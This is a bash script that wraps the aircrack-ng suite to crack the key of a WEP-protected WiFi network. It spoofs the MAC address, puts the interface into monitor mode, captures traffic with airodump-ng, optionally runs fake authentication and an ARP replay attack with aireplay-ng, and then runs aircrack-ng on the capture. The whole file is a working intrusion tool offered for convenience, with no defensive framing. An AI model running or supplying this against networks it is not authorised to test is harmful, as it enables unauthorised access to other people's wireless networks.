#!/bin/bash
 
# This script is just a convenient way to not have to remember the specific commands for cracking
# the key of a WEP protected WiFi network.
# You still need to have the aircrack-ng suite and macchanger installed.
 
# The specific replay attack done is an ARP replay attack. (-3)
 
 
# Select WiFi interface
IFACE=wlan0
echo "Known interfaces:"
/sbin/ifconfig -a | grep -i link | cut -d" " -f 1
 
echo -ne "\nUse interface [${IFACE}]: "
read UIFACE
if [ -n "${UIFACE}" ]; then
	IFACE=$UIFACE
fi
 
 
# Set (fake) mac address
MAC=`/sbin/ifconfig $IFACE | grep HWaddr | cut -d" " -f 11`
 
echo -ne "\nUse real mac address or enter fake now.\n"
echo -ne "MAC [${MAC}]: "
read UMAC
if [ -n "${UMAC}" ]; then
	MAC=$UMAC
fi
 
 
# Set output files
IVFILE=~/wep
echo -ne "\nOutput file [${IVFILE}]: "
read UIVFILE
if [ -n "${UIVFILE}" ]; then
	IVFILE=$UIVFILE
fi
CAPFILE=$IVFILE-01.cap
 
 
# Configure interface(s)
MFACE=mon0
airmon-ng stop $IFACE
ifconfig $IFACE down
macchanger --mac 00:11:22:33:44:55 $IFACE
airmon-ng start $IFACE
 
echo -ne "\nMonitor mode is hopefully enabled now. Check output for monitor interface\n"
echo -ne "Monitor interface [${MFACE}]: "
read UMFACE
if [ -n "${UMFACE}" ]; then
	MFACE=$UMFACE
fi
 
 
# Gather network information
xterm -bg black -fg green -e airodump-ng $MFACE &
 
BSSID=00:11:22:33:44:66
echo -ne "\nBSSID [${BSSID}]: "
read UBSSID
if [ -n "${UBSSID}" ]; then
	BSSID=$UBSSID
fi
 
ESSID=ap_name
echo -ne "\nESSID [${ESSID}]: "
read UESSID
if [ -n "${UESSID}" ]; then
	ESSID=$UESSID
fi
 
CHAN=11
echo -ne "\nChannel [${CHAN}]: "
read UCHAN
if [ -n "${UCHAN}" ]; then
	CHAN=$UCHAN
fi
 
echo "You can now close the xterm running airodump. (Press enter to continue)"
read wait
 
 
# Start capturing packets
echo -ne "\n\nStarting packet capture\n"
xterm -bg black -fg green -e airodump-ng -c $CHAN -w $IVFILE --bssid $BSSID $MFACE &
 
 
# Replay attacks
echo -ne "\nAttempt replay attacks? This will speed up IV capture but is very noisy\n"
echo -ne "Replay attack? [y/N]: "
read replay
 
if [ "$replay" = "y" -o "$replay" = "Y" ]; then
 
	# Attempt fake auth with AP
	xterm -bg black -fg green -e aireplay-ng -1 0 -a $BSSID -h $MAC -e $ESSID $MFACE
 
	# Do ARP replay attack
	xterm -bg black -fg green -e aireplay-ng -3 -b $BSSID -h $MAC $MFACE &
fi
 
 
# Start cracking
echo -ne "\n\nWhen enough IV's (#Data) have been captured (10k or so) press enter to start cracking\n"
echo -ne "If it fails run the following command to try again with more data:\n"
echo "aircrack-ng -b ${BSSID} ${CAPFILE}"
read wait
xterm -hold -bg black -fg green -e aircrack-ng -b $BSSID $CAPFILE &
 